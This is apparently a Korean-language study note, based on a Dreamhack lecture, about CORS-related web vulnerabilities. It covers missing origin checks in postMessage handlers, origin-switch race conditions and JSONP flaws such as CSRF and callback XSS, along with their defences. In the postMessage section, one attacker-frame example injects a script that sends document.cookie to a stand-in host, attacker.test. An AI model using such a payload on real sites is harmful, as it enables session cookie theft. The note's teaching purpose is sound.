# CORS Vulnerability

* SOP의 한계를 극복하고 Origin 간 자원 공유를 돕기 위해 ```postMessage```, JSONP 및 CORS 정책 기술이 도입됨
    - CORS(Cross Origin Resource Sharing): **SOP 보안 정책을 우회**하여 Cross Origin 간 자원을 공유하기 위한 방법 중 하나 → ⚠️ **잘못 사용할 경우 사이트 간 공격이 가능해지는 취약점이 발생할 수 있음**
        + 웹 상에 있는 서비스에만 제약되는 것이 아님
        + 📚 [Same Origin Policy(SOP).md](https://github.com/augustf86/Today_I_Learn/blob/main/Security/Background/Same%20Origin%20Policy(SOP).md) 내용 참고

<br/>

* CORS 기술의 사용에 있어 발생할 수 있는 취약점의 종류
    | 취약점 종류 | 설명 |
    |:---:|------|
    | 현재 사이트에서 <br/> 다른 사이트로 <br/> 정보 유출 <br/> (기밀성) | CORS는 모든 정보를 공개하는 Open API뿐만 아니라 특정 대상에게만 자원을 공유하고자 하는 사이트에서도 <br/>사용할 수 있음 <br/> &nbsp;&nbsp; - 다른 사이트로부터 CORS 요청을 받을 때 **그 Origin에 대한 검사가 진행되지 않고 응답하거나 Origin에 제약이 <br/> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;없는 경우** 민감한 정보가 다른 사이트에 노출될 수 있음 |
    | 다른 사이트에서 <br/> 현재 사이트로 <br/> 변조 (무결성) | CORS 요청의 Origin에서 **신뢰할 수 있는 출처인지 확인 또는 제한하지 않거나** CORS 응답을 **그대로 사용**할 경우<br/> XSS 등의 보안 문제가 발생할 수 있음 <br/> &nbsp;&nbsp; - CORS 도입 시 어떤 사이트를 얼마나 신뢰하느냐가 결정되어야 함 <br/> &nbsp;&nbsp; - XSS 필터 등 신뢰하지 않는 입력에 대한 방어가 병행되어야 함 |

<br/><br/>

## postMessage 취약점
### Window.postMessage API
* postMessage API 도입 배경
    | 시기 | 설명 |
    |:---:|------|
    | 웹 초창기 <br/> (SOP 도입 전) | 프레임과 창들은 자유롭게 서로의 코드를 호출할 수 있었음 |
    | SOP 도입 후 | 서로 다른 오리진들은 직접적으로 리소스를 공유하지 못하게 됨 <br/> &nbsp;&nbsp; → 해결책으로 **서로 다른 Origin 간에 메시지를 주고받을 수 있는 API**가 고안됨

* postMessage API를 이용한 메세지 송수신 관련 메소드와 이벤트 → 📚 [Window: postMessage() method Docs](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) 참고
    - 메시지 전송(송신)을 위해서 대상 윈도우의 **```postMessage``` 메소드**를 호출함
        ```javascript
        targetWindow.postMessage(message, targetOrigin[, transfer])
        ```
        | 변수 | 설명 |
        |---|------|
        | ```targetWindow``` | 메시지를 보낼 대상 Window |
        | ```message``` | 메시지 객체 (함수, DOM 객체 등은 보낼 수 없음) |
        | ```targetOrigin``` | 메시지 송신 시점에 ```targetWindow```의 Origin이 ```targetOrigin```과 일치하여야 함 <br/> &nbsp;&nbsp; - ```targetOrigin```에 ```"*"```을 지정하면 Origin 검사가 이루어지지 않음 |
        | ```transfer``` | (optional) ```ArrayBuffer```나 canvas context 등 소유권을 전이할 객체의 배열을 지정 |
    - 메시지 수신을 위해서 수신하는 윈도우에서 **```message``` 전역 이벤트**를 청취함
        | 고유 속성 | 설명 |
        |---|------|
        | ```origin``` | 메시지를 송신한 Origin 반환 |
        | ```source``` | 메시지를 송신한 Window 객체 반환 |
        | ```data``` | 복사된 메시지 객체 또는 값 반환 |

* postMessage API를 이용한 메시지 송수신 예시
    ```javascript
    // 메시지 송신
    targetWindow.postMessage(message, targetOrigin);

    // 메시지 수신
    window.onmessage = function (e) {
        if (e.origin === 'https://sample.com') {
            console.log(e.data);
            e.source.postMessage('Hello World!', e.origin);
        }
    }
    ```

* ⚠️ postMessage 사용 시 주의 사항
    - ```postMessage```를 통해 ```message```로 문자열뿐만 아니라 객체 또한 주고받을 수 있음 <br/> &nbsp;&nbsp; → **보안을 위해 함수(객체 메소드 포함), DOM 노드(요소 등) 객체, 프로토 타입 및 ```get```/```set``` 속성 정보는 보낼 수 없음**
    - 전송되는 모든 객체는 복사됨 → 송신 후 객체를 변경하여도 수신하는 윈도우에서는 변경 내용을 볼 수 없음

<br/>

### Origin 미확인 시 발생할 수 있는 취약점
* Window.postMessage API 사용 시 Origin을 정확히 지정 및 검사해야 함
    - 📌 **SOP를 우회**하여 자유자재로 다른 윈도우와 통신할 수 있도록 만들어진 API → Origin 검사 또한 **웹 개발자의 책임**이 됨
    - 특정 윈도우는 모든 Origin에서 오는 메시지를 수신할 수 있음
        + ⚠️ ```message``` 이벤트 핸들러에서 **```origin``` 속성을 검사하지 않고 메시지의 내용을 신뢰**하면 보안 문제가 발생할 수 있음
* Origin 미확인 시 발생할 수 있는 취약점 예시 코드 (전체 코드는 [여기](https://learn.dreamhack.io/325#5)를 참고)
    - Parent Window 코드 일부
        ```javascript
        // https;//dreamhack.io
        window.onmessage = function (e) {
            var dialog = document.getElementById('my-dialog');
            if (dialog == null) {
                dialog = document.createElement('dialog');
                dialog.id = 'my-dialog';
                document.body.appendChild(dialog);
            }
            dialog.setAttribute('open', '');
            dialog.innerHTML = e.data; // Insert html
        };
        ```
        + 프레임 내 하위 윈도우에서 부모 윈도우(Parent Window)로 postMessage를 보내는 상황
            - ```dialog.innerHTML = e.data;``` → 부모 윈도우에서 수신한 ```message```의 ```data```를 ```innerHTML```로 넣고 있음
                + ⚠️ 부모 윈도우(Parent Window)에서 postMessage의 Origin을 확인하지 않음 → 공격자의 오리진에서 임의의 HTML를 삽입할 수 있음
        <br/>
        <img width="2560" alt="postMessage API Origin 미검사" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/11773e59-1d2a-4673-b600-2a343b13d0ef"><br/><br/>
  
        + [정상적인 상황] 의도된 프레임 코드 일부
            ```javascript
            // https://bob.dreamhack.io
            parent.postMessage('<h1>안내</h1><p>작업이 완료되었습니다.</p>', 'https://dreamhack.io');
            ```
        + [공격 상황] 공격자 프레임 코드 일부
            ```javascript
            // https://attacker.test
            parent.postMessage(`XSS attack<script>new Image().src="https://attacker.test/retrieve?" + document.cookie);
            alert(document.domain);
            <${'/'}script>`, 'https://dreamhack.io/');
            ```

<br/>

### Origin 전환 경합 조건
* 📌 ```postMessage``` 사용 시 **메시지를 보내는 대상이 웹 문서가 아닌 창(윈도우)이라는 것**을 반드시 기억해야 함
    - 웹 문서와 창(윈도우)의 차이점
        | 종류 | 설명 |
        |:---:|------|
        | 웹 문서 | 일반적으로 **출처가 고정**되어 있음 (**Origin이 변경되지 않음**) |
        | 창(윈도우) | 사용자가 하이퍼링크를 방문하거나 스크립트가 다른 문서로 리다이렉트시켜 **Origin이 변경될 수 있음** <br/> &nbsp;&nbsp; → ⚠️ 이 상태에서 메시지 전송 시 본래 의도하지 않은 Origin으로 메시지가 전송되는 보안 문제가 발생할 수 있음 |
    - 창(윈도우)의 특성 상 발생하는 보안 문제의 해결 방법
        - ```postMessage```의 두 번째 매개변수인 ```targetOrigin```에 대상 문자열을 명시함
            | ```targetOrigin```의 값 | 설명 |
            |:---:|-------|
            | 일반적인 값 | 메시지 송신 시점에 Origin을 검사하여 일치하지 않는 경우 송신을 거부함 |
            | ```"*"``` 지정 | ```targetWindow```의 Origin이 무엇이든지 상관없이 메세지가 보내짐 → ⚠️ 권장하지 않음 | 

<br/>

### postMessage API를 이용한 실제 공격 시나리오
| 순서 | 설명 |
|:---:|------|
| 01 | Parent Window에서 Child Window 생성
| 02 | Child Window가 Parent Window한테 ```postMessage```로 메시지 및 비밀값 전송 |
| 03 | Parent Window가 공격자의 다른 웹 사이트로 리다이렉트 |
| 04 | Child Window는 여전히 Parent Window에게 메시지 및 비밀 값 전송 |
| 05 | 공격자 사이트가 Child Window가 보내주는 메시지 수신 |

<br/><br/>

## JSONP 취약점
### JSONP (JSON with Padding)
* CORS 기술이 도입되기 전 SOP를 우회하기 위해 흔히 쓰였던 방식
    - JSONP API은 JSON API와 유사하지만, 아래와 같은 차이점이 있음
        | | 차이점 (JSONP API의 특징) |
        |:---:|------|
        | 01 | 응답 데이터를 특정 콜백 함수를 호출하는 코드로 감싼 형태를 가지고 있음 |
        | 02 | 요청 시 XHR이 아니라 아래와 같은 스크립트로 포함시켜 동작함 <br/> &nbsp;&nbsp; ```<script src="https://api.test/request.jsonp?id=123&callback=onAPIResponse">``` <br/> &nbsp;&nbsp;&nbsp;&nbsp; → 웅답은 ```onAPIResponse({...});``` 식으로 생성되어 최종적으로 본래 문서의 함수를 호출하게 됨 |

<br/>

### JSONP 취약점 #1: Origin 검사 부재로 인한 CSRF
* JSONP에 한정된 취약점은 아니지만, 전적으로 HTTP GET 메소드에 의존하는 JSONP 특성 상 CSRF 공격에 더 취약한 특성이 있음
    - EX: 민감한 정보를 반환하거나 권한이 필요한 작업을 수행하는 ```/users/get_user_info?callback=``` JSONP API가 존재
        + ⚠️ 피해자가 CSRF 공격에 노출되었을 경우 **JSONP API를 이용한 추가적인 정보 유출 및 피해가 발생할 수 있음**
* 추가적인 정보 유출 및 피해 발생 문제의 방어책
    - JSONP 요청을 처리할 때 요청자의 Origin을 검사함
    - CSRF Token을 사용하는 방법

<br/>

### JSONP 취약점 #2: 콜백 함수명 검증 부재로 인한 제공자 XSS
* JSONP API 대다수는 **사용자가 콜백 함수명을 직접 지정할 수 있도록** 하고 있음
    - 콜백 명에 HTML 코드 등을 삽입할 경우 브라우저는 이를 HTML로 인식함 → ⚠️ *XSS 취약점 발생!*
* 콜백 HTML 삽입 방지책
    | | 방지책 |
    |:---:|------|
    | 기본 | 콜백 명에 필터를 적용하는 것을 권장함 |
    | 추가 | - HTTP ```Accept``` 헤더에 ```text/javascript``` MIME 타입이 포함되어 있는지 검사 <br/> - ```Content-Type: text/javascript```  설정 및 ```X-Content-Type-Options: nosniff``` 헤더로 <br/> &nbsp;&nbsp; 응답이 자바스크립트가 아닌 다른 콘텐츠로 인식되는 경우를 방지 |


<br/>

### JSONP 취약점 #3: JSONP API 침해 사고 발생 시 이용자 XSS
* JSONP는 **API 제공자의 코드를 그대로 사용자의 웹 문서에서 실행**함
    - ⚠️ JSONP API가 침해 사고를 당해 악의적인 응답이 들어옴 → 이를 이용하는 모든 사이트는 XSS 공격에 노출됨 (JSONP API의 가장 큰 단점)
* JSONP API의 침해 사고로 XSS 공격에 노출되는 경우의 방지책
    - CSP를 사용하고 JSONP를 제공하는 웹 서비스를 신뢰하는 것 외에는 **별다른 방법이 없음** <br/> &nbsp;&nbsp; → 📌 JSONP 사용을 피하고 CORS 정책 헤더를 대신 사용해야 하는 이유!


<br/><br/><br/><br/>
### 🔖 출처
* [드림핵 Web Hacking Advanced - Client Side] 📌 [Exploit Tech: CORS Vulnerability](https://dreamhack.io/lecture/courses/325)
